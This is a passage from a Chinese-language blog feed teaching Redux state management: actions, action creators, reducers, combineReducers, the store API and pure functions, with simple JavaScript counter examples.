id="理解-Redux-数据流"><a href="#理解-Redux-数据流" class="headerlink" title="理解 Redux 数据流"></a>理解 Redux 数据流</h1><p><img src="https://oss.iyouhun.com/img/md/ReduxDataFlow.49fa8c39.gif" alt="ReduxDataFlow.49fa8c39"></p><ul><li>任何一个组件都可以直接接入 Redux，也就是可以直接：1 修改 Redux 状态 2 接收 Redux 状态</li><li>并且，只要 Redux 中的状态改变了，所有接收该状态的组件都会收到通知，也就是可以获取到最新的 Redux 状态</li><li>这样的话，两个组件不管隔得多远，都可以<strong>直接通讯</strong>了</li></ul><h1 id="代码结构"><a href="#代码结构" class="headerlink" title="代码结构"></a>代码结构</h1><p>在使用 Redux 进行项目开发时，不会将 action/reducer/store 都放在同一个文件中，而是会进行拆分</p><p>可以按照以下结构，来组织 Redux 的代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/store        --- 在 src 目录中创建，用于存放 Redux 相关的代码</span><br><span class="line">  /actions    --- 存放所有的 action</span><br><span class="line">  /reducers   --- 存放所有的 reducer</span><br><span class="line">  index.js    --- redux 的入口文件，用来创建 store</span><br></pre></td></tr></table></figure><h1 id="ActionType的使用"><a href="#ActionType的使用" class="headerlink" title="ActionType的使用"></a>ActionType的使用</h1><ul><li><p>Action Type 指的是：action 对象中 type 属性的值</p></li><li><p>Redux 项目中会多次使用 action type，比如，action 对象、reducer 函数、dispatch(action) 等</p></li><li><p>目标：<strong>集中处理 action type，保持项目中 action type 的一致性</strong></p></li><li><p>action type 的值采用：<code>&#39;domain/action&#39;(功能/动作)形式</code>，进行分类处理，比如，</p><ul><li>计数器：<code>&#39;counter/increment&#39;</code> 表示 Counter 功能中的 increment 动作</li><li>登录：<code>&#39;login/getCode&#39;</code> 表示登录获取验证码的动作</li><li>个人资料：<code>&#39;profile/get&#39;</code> 表示获取个人资料</li></ul></li></ul><p><strong>步骤</strong>：</p><ol><li>在 store 目录中创建 <code>actionTypes</code> 目录或者 <code>constants</code> 目录，集中处理</li><li>创建<strong>常量</strong>来存储 action type，并导出</li><li>将项目中用到 action type 的地方替换为这些常量，从而保持项目中 action type 的一致性</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// actionTypes 或 constants 目录：</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> increment = <span class="string">'counter/increment'</span></span><br><span class="line"><span class="keyword">const</span> decrement = <span class="string">'counter/decrement'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> &#123; increment, decrement &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// --</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用：</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// actions/index.js</span></span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> types <span class="keyword">from</span> <span class="string">'../acitonTypes'</span></span><br><span class="line"><span class="keyword">const</span> increment = <span class="function"><span class="params">payload</span> =&gt;</span> (&#123; <span class="attr">type</span>: types.increment, payload &#125;)</span><br><span class="line"><span class="keyword">const</span> decrement = <span class="function"><span class="params">payload</span> =&gt;</span> (&#123; <span class="attr">type</span>: types.decrement, payload &#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// reducers/index.js</span></span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> types <span class="keyword">from</span> <span class="string">'../acitonTypes'</span></span><br><span class="line"><span class="keyword">const</span> reducer = <span class="function">(<span class="params">state, action</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">switch</span> (action.type) &#123;</span><br><span class="line">    <span class="keyword">case</span> types.increment:</span><br><span class="line">      <span class="keyword">return</span> state + <span class="number">1</span></span><br><span class="line">    <span class="keyword">case</span> types.decrement:</span><br><span class="line">      <span class="keyword">return</span> state - action.payload</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> state</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em>注：额外添加 Action Type 会让项目结构变复杂，此操作可省略。但，<code>domain/action</code> 命名方式强烈推荐！</em></p><h1 id="Reducer的分离与合并"><a href="#Reducer的分离与合并" class="headerlink" title="Reducer的分离与合并"></a>Reducer的分离与合并</h1><ul><li><p>随着项目功能变得越来越复杂，需要 Redux 管理的状态也会越来越多</p></li><li><p>此时，有两种方式来处理状态的更新：</p><ol><li>使用一个 reducer：处理项目中所有状态的更新</li><li>使用多个 reducer：按照项目功能划分，每个功能使用一个 reducer 来处理该功能的状态更新</li></ol></li><li><p>推荐：<strong>使用多个 reducer（第二种方案）</strong>，每个 reducer 处理的状态更单一，职责更明确</p></li><li><p>此时，项目中会有多个 reducer，但是 <strong>store 只能接收一个 reducer</strong>，因此，需要将多个 reducer 合并为一根 reducer，才能传递给 store</p></li><li><p>合并方式：使用 Redux 中的 <code>combineReducers</code> 函数</p></li><li><p>注意：</p><p>合并后，Redux 的状态会变为一个对象，对象的结构与 combineReducers 函数的参数结构相同</p><ul><li>比如，此时 Redux 状态为：<code>{ a： aReducer 处理的状态, b： bReducer 处理的状态 }</code></li></ul></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; combineReducers &#125; <span class="keyword">from</span> <span class="string">'redux'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 计数器案例，状态默认值为：0</span></span><br><span class="line"><span class="keyword">const</span> aReducer = <span class="function">(<span class="params">state = <span class="number">0</span>, action</span>) =&gt;</span> &#123;&#125;</span><br><span class="line"><span class="comment">// Todos 案例，状态默认值为：[]</span></span><br><span class="line"><span class="keyword">const</span> bReducer = <span class="function">(<span class="params">state = [], action</span>) =&gt;</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 合并多个 reducer 为一个 根reducer</span></span><br><span class="line"><span class="keyword">const</span> rootReducer = combineReducers(&#123;</span><br><span class="line">  a: aReducer,</span><br><span class="line">  b: bReducer</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建 store 时，传入 根reducer</span></span><br><span class="line"><span class="keyword">const</span> store = createStore(rootReducer)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 此时，合并后的 redux 状态： &#123; a: 0, b: [] &#125;</span></span><br></pre></td></tr></table></figure><ul><li><p>注意：虽然在使用<code>combineReducers</code>以后，整个 Redux 应用的状态变为了<code>对象</code>，但是，对于每个 reducer 来说，每个 reducer 只负责整个状态中的某一个值</p><ul><li>也就是：<strong>每个reducer只负责自己要处理的状态</strong></li></ul></li><li>举例：<ul><li>登录功能：<code>loginReducer</code> 处理的状态只应该是跟登录相关的状态<ul><li>个人资料：<code>profileReducer</code> 处理的状态只应该是跟个人资料相关的状态</li></ul></li></ul></li><li>合并 reducer 后，redux 处理方式：只要合并了 reducer，不管分发什么 action，所有的 reducer 都会执行一次。各个 reducer 在执行的时候，能处理这个 action 就处理，处理不了就直接返回上一次的状态。所以，我们分发的某一个 action 就只能被某一个 reducer 来处理，也就是最终只会修改这个 reducer 要处理的状态，最终的表现就是：分发了 action，只修改了 redux 中这个 action 对应的状态！</li></ul><h1 id="redux管理哪些状态"><a href="#redux管理哪些状态" class="headerlink" title="redux管理哪些状态"></a>redux管理哪些状态</h1><p>不同状态的处理方式：</p><ol><li>将所有的状态全部放到 redux 中，由 redux 管理</li><li>只将某些状态数据放在 redux 中，其他数据可以放在组件中，比如：<ul><li>如果一个状态，只在某个组件中使用（比如，表单项的值），推荐：放在组件中</li><li>需要放到 redux 中的状态：<ol><li>在多个组件中都要使用的数据【涉及组件通讯】</li><li>通过 ajax 请求获取到的接口数据【涉及到请求相关逻辑代码放在哪的问题】</li></ol></li></ul></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;React-Redux介绍&quot;&gt;&lt;a href=&quot;#React-Redux介绍&quot; class=&quot;headerlink&quot; title=&quot;React-Redux介绍&quot;&gt;&lt;/a&gt;React-Redux介绍&lt;/h1&gt;&lt;p&gt;为什么要使用 React-Redux 绑定库?&lt;/p
      
    
    </summary>
    
      <category term="前端" scheme="//www.shen.ee/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="Redux状态管理工具" scheme="//www.shen.ee/tags/Redux%E7%8A%B6%E6%80%81%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/"/>
    
      <category term="状态管理工具" scheme="//www.shen.ee/tags/%E7%8A%B6%E6%80%81%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/"/>
    
      <category term="react-redux" scheme="//www.shen.ee/tags/react-redux/"/>
    
      <category term="actionType" scheme="//www.shen.ee/tags/actionType/"/>
    
  </entry>
  
  <entry>
    <title>Redux状态管理工具学习</title>
    <link href="//www.shen.ee/article/57612.html"/>
    <id>//www.shen.ee/article/57612.html</id>
    <published>2022-06-15T03:38:39.000Z</published>
    <updated>2022-06-22T06:24:26.004Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Redux-概念"><a href="#Redux-概念" class="headerlink" title="Redux-概念"></a>Redux-概念</h2><blockquote><p>Redux 是 React 中最常用的状态管理工具（状态容器）</p></blockquote><p>文档：</p><ul><li><a href="http://cn.redux.js.org/" target="_blank" rel="noopener">redux 中文文档</a></li><li><a href="https://redux.js.org/" target="_blank" rel="noopener">redux 英文文档</a></li></ul><p>React的问题：</p><ul><li>React 只是 DOM 的一个抽象层（UI 库），并不是 Web 应用的完整解决方案。</li><li>因此 React 在涉及到数据的处理以及组件之间的通信时会比较复杂 。</li><li>对于大型的复杂应用来说，这两方面恰恰是最关键的，需要一个专门的状态工具。</li></ul><p>背景介绍：</p><ul><li>2014 年 Facebook 提出了 Flux 架构的概念（前端状态管理的概念），引发了很多的实现</li><li>2015 年，Redux 出现，将 Flux 与<em>函数式编程</em>结合一起，很短时间内就成为了最热门的前端架构</li><li>Flux 是最早的前端的状态管理工具，它提供了状态管理的思想，也提供对应的实现</li><li>除了 Flux、Redux 之外，还有：Mobx 等状态管理工具</li></ul><p>为什么需要Redux?</p><p><img src="https://oss.iyouhun.com/img/md/with-redux.e1b68afc.png" alt="with-redux.e1b68afc"></p><ul><li>不使用 Redux (图左边) ：<ul><li>只能使用父子组件通讯、状态提升等 React 自带机制</li><li>处理远房亲戚(非父子)关系的组件通讯时乏力</li><li>组件之间的数据流混乱，出现 Bug 时难定位</li></ul></li><li>使用 Redux (图右边)：<ul><li><strong>集中式存储和管理应用的状态</strong></li><li>处理组件通讯问题时，<strong>无视组件之间的层级关系</strong></li><li>简化大型复杂应用中组件之间的通讯问题</li><li>数据流清晰，易于定位 Bug</li></ul></li></ul><h2 id="Redux-核心要素"><a href="#Redux-核心要素" class="headerlink" title="Redux-核心要素"></a>Redux-核心要素</h2><p>为了让<strong>代码各部分职责清晰、明确</strong>，Redux 代码被分为三个核心概念：action/reducer/store</p><ol><li>三个核心概念的职责分别是什么<ul><li>action -&gt; reducer -&gt; store</li><li><strong>action</strong>（动作）：描述要做的事情</li><li><strong>reducer</strong>（函数）：更新状态</li><li><strong>store</strong>（仓库）：整合 action 和 reducer</li></ul></li><li>类比生活<ol><li>action：相当于公司中要做的事情，比如软件开发、测试，打扫卫生等</li><li>reducer：相当于公司的员工，负责干活的</li><li>store：相当于公司的老板</li><li>流程：老板(store)分配公司中要做的事情(action)给员工(reducer)，员工干完活把结果交给老板</li></ol></li></ol><h2 id="Redux-核心action"><a href="#Redux-核心action" class="headerlink" title="Redux-核心action"></a>Redux-核心action</h2><blockquote><p><code>action</code> 就是一个对象，<code>type</code> 描述行为，约定 <code>payload</code>做为传参。</p></blockquote><p>解释：</p><ul><li><code>action</code> 行动（名词）、动作</li><li>描述要做的事情，项目中的每一个功能都是一个 <code>action</code></li><li>例如：<ul><li>计数器案例：计数器加1、减1</li><li>购物车案例：获取购物车数据、切换商品选中状态</li><li>项目：登录，退出等</li></ul></li></ul><p>特点：</p><ul><li><code>action</code> 只描述做什么事情</li><li><code>action</code> 是一个JS对象，必须带有 <code>type</code> 属性，用于区分动作的类型</li><li>根据功能的不同，可以携带额外的数据（比如，<code>payload</code> 有效载荷），配合该动作来完成相应功能</li></ul><p>举例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 计数器案例</span></span><br><span class="line">&#123; type： <span class="string">'increment'</span> &#125; <span class="comment">// +1</span></span><br><span class="line">&#123; type： <span class="string">'decrement'</span> &#125; <span class="comment">// -1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 累加10操作</span></span><br><span class="line">&#123; type： <span class="string">'increment'</span>, <span class="attr">payload</span>: <span class="number">10</span> &#125; <span class="comment">// +10</span></span><br><span class="line">&#123; type： <span class="string">'decrement'</span>, <span class="attr">payload</span>: <span class="number">10</span> &#125; <span class="comment">// -10</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 购物车案例</span></span><br><span class="line">&#123; <span class="attr">type</span>: <span class="string">'getGoodsList'</span> &#125;</span><br><span class="line">&#123; <span class="attr">type</span>: <span class="string">'changeGoodsState'</span>, <span class="attr">payload</span>: &#123; <span class="attr">id</span>: <span class="number">1</span>, <span class="attr">goodsState</span>: <span class="literal">true</span> &#125; &#125;</span><br></pre></td></tr></table></figure><h3 id="action-creator"><a href="#action-creator" class="headerlink" title="action creator"></a>action creator</h3><blockquote><p>使用函数创建 action 对象，简化多次使用 action 时，重复创建 action 对象</p></blockquote><p>举例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 不使用 Action Creator</span></span><br><span class="line"><span class="comment">// 创建多个 action 时，需要重复手动创建 action 对象，很繁琐</span></span><br><span class="line">&#123; <span class="attr">type</span>: <span class="string">'decrement'</span>, <span class="attr">payload</span>: <span class="number">2</span> &#125;</span><br><span class="line">&#123; <span class="attr">type</span>: <span class="string">'decrement'</span>, <span class="attr">payload</span>: <span class="number">8</span> &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 使用 Action Creator</span></span><br><span class="line"><span class="keyword">const</span> decrement = <span class="function"><span class="params">payload</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> &#123; <span class="attr">type</span>: <span class="string">'decrement'</span>, payload &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">decrement(<span class="number">2</span>) <span class="comment">// =&gt; &#123; type: 'decrement', payload: 2 &#125;</span></span><br><span class="line">decrement(<span class="number">8</span>) <span class="comment">// =&gt; &#123; type: 'decrement', payload: 8 &#125;</span></span><br><span class="line"><span class="comment">// 可以动态创建action</span></span><br></pre></td></tr></table></figure><h2 id="Redux-核心reducer"><a href="#Redux-核心reducer" class="headerlink" title="Redux-核心reducer"></a>Redux-核心reducer</h2><ul><li>名字是参考了 JS 数组中的 <code>reduce</code> 这个方法</li><li>数组中的 <code>reduce</code> 方法，可以来实现累计（比如，累加或者累减）</li></ul><p>作用：</p><ul><li>用来处理 action 并更新状态，是 Redux <code>状态更新</code> 的地方</li><li>函数签名为：<code>(prevState, action) =&gt; newState</code></li><li>接收上一次的状态和 action 作为参数，根据 action 的类型，执行不同操作，最终返回新的状态</li></ul><p>原则：</p><ul><li>函数一定要<strong>有返回值</strong>，即使状态没有改变也要返回上一次的状态</li><li>reducer 是一个纯函数<ul><li>不要使用 Math.random() / new Date() / Date.now() / ajax 请求等不纯的操作</li></ul></li><li>reducer 不能执行JS副作用<ul><li>不要直接修改当前状态，而是根据当前状态值创建新的状态值（新替旧）</li></ul></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 伪代码：</span></span><br><span class="line"><span class="comment">// prevState 上一次的状态</span></span><br><span class="line"><span class="comment">// action 当前要执行的动作</span></span><br><span class="line"><span class="keyword">const</span> reducer = <span class="function">(<span class="params">prevState, action</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> newState</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>示例:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 示例：</span></span><br><span class="line"><span class="comment">// state 上一次的状态</span></span><br><span class="line"><span class="comment">// action 当前要执行的动作</span></span><br><span class="line"><span class="keyword">const</span> reducer = <span class="function">(<span class="params">state, action</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">switch</span> (action.type) &#123;</span><br><span class="line">    <span class="comment">// 计数器增加</span></span><br><span class="line">    <span class="keyword">case</span> <span class="string">'increment'</span>:</span><br><span class="line">      <span class="comment">// 返回新状态</span></span><br><span class="line">      <span class="comment">// return state + 1</span></span><br><span class="line">      <span class="comment">// 根据 action 中提供的 payload 来决定到底增加多少</span></span><br><span class="line">      <span class="keyword">return</span> state + action.payload</span><br><span class="line">    <span class="comment">// 注意：一定要有 default，如果将来 reducer 无法处理某个 action，就直接将上一次的状态返回即可</span></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> state</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 模拟调用</span></span><br><span class="line">reducer(<span class="number">0</span>, &#123; <span class="attr">type</span>: <span class="string">'increment'</span> &#125;)  <span class="comment">// 本次执行完成后，状态变为：1</span></span><br><span class="line">reducer(<span class="number">1</span>, &#123; <span class="attr">type</span>: <span class="string">'increment'</span> &#125;)  <span class="comment">// 本次执行完成后，状态变为：2</span></span><br><span class="line">reducer(<span class="number">1</span>, &#123; <span class="attr">type</span>: <span class="string">'decrement'</span> &#125;)  <span class="comment">// 无法处理该 action，所以返回上一次状态：1</span></span><br></pre></td></tr></table></figure><p><strong>总结：</strong></p><ul><li><code>reducer</code> 是修改状态的地方，这里根据action的类型去修改状态</li><li>修改的原则：新值替换旧值，不能发请求和随机返回，不能操作全局变量</li></ul><h2 id="Redux-核心store"><a href="#Redux-核心store" class="headerlink" title="Redux-核心store"></a>Redux-核心store</h2><blockquote><p>通过store关联action和reducer</p></blockquote><p>store：仓库，Redux 的核心，整合 action 和 reducer</p><ul><li>特点：<ul><li><strong>一个应用只有一个 store</strong></li><li>维护应用的状态，获取状态：<code>store.getState()</code></li><li>发起状态更新时，需要分发 action：<code>store.dispatch(action)</code></li><li>创建 store 时<strong>接收 reducer 作为参数</strong>：<code>const store = createStore(reducer)</code></li></ul></li><li>其他 API，<ul><li>订阅(监听)状态变化：<code>const unSubscribe = store.subscribe(() =&gt; {})</code></li><li>取消订阅状态变化： <code>unSubscribe()</code></li></ul></li></ul><p>核心代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 提前安装 redux </span></span><br><span class="line"><span class="keyword">import</span> &#123; legacy_createStore <span class="keyword">as</span> createStore &#125; <span class="keyword">from</span> <span class="string">'redux'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建 store</span></span><br><span class="line"><span class="comment">// 参数为：reducer 函数</span></span><br><span class="line"><span class="keyword">const</span> store = createStore(reducer)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 更新状态</span></span><br><span class="line"><span class="comment">// dispatch 派遣，派出。表示：分发一个 action，也就是发起状态更新</span></span><br><span class="line">store.dispatch(action)</span><br><span class="line">store.dispatch( increment(<span class="number">2</span>) )</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取状态</span></span><br><span class="line"><span class="keyword">const</span> state = store.getState()</span><br><span class="line"></span><br><span class="line"><span class="comment">// ---</span></span><br><span class="line"><span class="comment">// 其他 API</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 监听状态变化</span></span><br><span class="line"><span class="keyword">const</span> unSubscribe = store.subscribe(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 状态改变时，执行相应操作</span></span><br><span class="line">  <span class="comment">// 比如，记录 redux 状态</span></span><br><span class="line">  <span class="built_in">console</span>.log(store.getState())</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 取消监听状态变化</span></span><br><span class="line">unSubscribe()</span><br></pre></td></tr></table></figure><h2 id="Redux-默认值由来"><a href="#Redux-默认值由来" class="headerlink" title="Redux-默认值由来"></a>Redux-默认值由来</h2><ul><li>只要创建 store，那么，Redux 就会调用一次 reducer，这一次就是初始化默认值。</li><li>第一次调用 reducer <code>reducer(undefined, {type: &quot;@@redux/INITv.a.4.t.t.p&quot;})</code></li><li>因为传入的状态值是 undefined ，并且是一个随机的 action type，所以：<ul><li>状态值因为 undefined，所以，我们设置的默认值就会生效 <code>state = 10</code></li><li>因为是一个随机的 action type，那就一定会走 default，返回默认值 <code>10</code></li><li>Redux 内部拿到状态值，就用这个状态值，来作为了 store 中状态的默认值</li><li>因此，将来当我们调用 <code>store.getState()</code> 方法来获取 Redux 状态值就是默认值</li></ul></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 导入 createStore</span></span><br><span class="line"><span class="keyword">import</span> &#123; legacy_createStore <span class="keyword">as</span> createStore &#125; <span class="keyword">from</span> <span class="string">'redux'</span></span><br><span class="line"><span class="comment">// 创建 store</span></span><br><span class="line"><span class="keyword">const</span> store = createStore(reducer)</span><br><span class="line"></span><br><span class="line"><span class="comment">// action =&gt; &#123; type: 'increment' &#125;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reducer</span>(<span class="params">state = <span class="number">10</span>, action</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'reducer:'</span>, state, action)</span><br><span class="line">  <span class="keyword">switch</span> (action.type) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'increment'</span>:</span><br><span class="line">      <span class="keyword">return</span> state + <span class="number">1</span></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> state</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">store.dispatch(increment())</span><br><span class="line"><span class="comment">// 相当于：store.dispatch(&#123; type: 'increment' &#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'store 状态值为：'</span>, store.getState())</span><br></pre></td></tr></table></figure><h2 id="Redux-执行过程分析"><a href="#Redux-执行过程分析" class="headerlink" title="Redux-执行过程分析"></a>Redux-执行过程分析</h2><ol><li>创建 store 时，Redux 就会先调用一次 reducer，来获取到默认状态</li><li>分发动作 <code>store.dispatch(action)</code>更新状态</li><li>Redux store 调用 reducer 传入：上一次的状态（当前示例中就是：<code>10</code>）和 action（<code>{ type: &#39;increment&#39; }</code>），计算出新的状态并返回</li><li>reducer 执行完毕后，将最新的状态交给 store，store 用最新的状态替换旧状态，状态更新完毕</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; legacy_createStore <span class="keyword">as</span> createStore &#125; <span class="keyword">from</span> <span class="string">'redux'</span></span><br><span class="line"><span class="keyword">const</span> store = createStore(reducer)</span><br><span class="line"></span><br><span class="line"><span class="comment">// reducer(10, &#123; type: 'increment' &#125;)</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reducer</span>(<span class="params">state = <span class="number">10</span>, action</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'reducer:'</span>, state, action)</span><br><span class="line">  <span class="keyword">switch</span> (action.type) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'increment'</span>:</span><br><span class="line">      <span class="keyword">return</span> state + <span class="number">1</span></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> state</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'状态值为：'</span>, store.getState()) <span class="comment">// 10</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 发起更新状态：</span></span><br><span class="line"><span class="comment">// 参数： action 对象</span></span><br><span class="line">store.dispatch(&#123; <span class="attr">type</span>: <span class="string">'increment'</span> &#125;)</span><br><span class="line"><span class="comment">// 相当于： reducer(10, &#123; type: 'increment' &#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'更新后：'</span>, store.getState()) <span class="comment">// 11</span></span><br></pre></td></tr></table></figure><h2 id="纯函数-amp-JS副作用"><a href="#纯函数-amp-JS副作用" class="headerlink" title="纯函数&amp;JS副作用"></a>纯函数&amp;JS副作用</h2><p>纯函数：</p><ul><li>纯函数是<em>函数式编程</em>中的概念，对于纯函数来说，<strong>相同的输入总是得到相同的输出</strong></li><li>参考资料：<a href="https://www.ruanyifeng.com/blog/2012/04/functional_programming.html" target="_blank" rel="noopener">函数式编程初探</a></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 纯函数：</span></span><br><span class="line"><span class="keyword">const</span> add = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">123</span></span><br><span 